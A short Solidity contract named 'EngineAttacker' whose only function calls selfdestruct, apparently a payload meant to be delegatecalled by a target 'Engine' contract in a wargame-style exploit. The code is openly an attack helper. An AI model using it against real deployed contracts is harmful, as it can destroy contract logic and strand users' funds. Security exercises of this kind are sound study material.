// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

contract EngineAttacker {
    address payable private owner;

    constructor () public {
        owner = msg.sender;
    }
    function destroyContract() external {
        selfdestruct(owner);
    }
}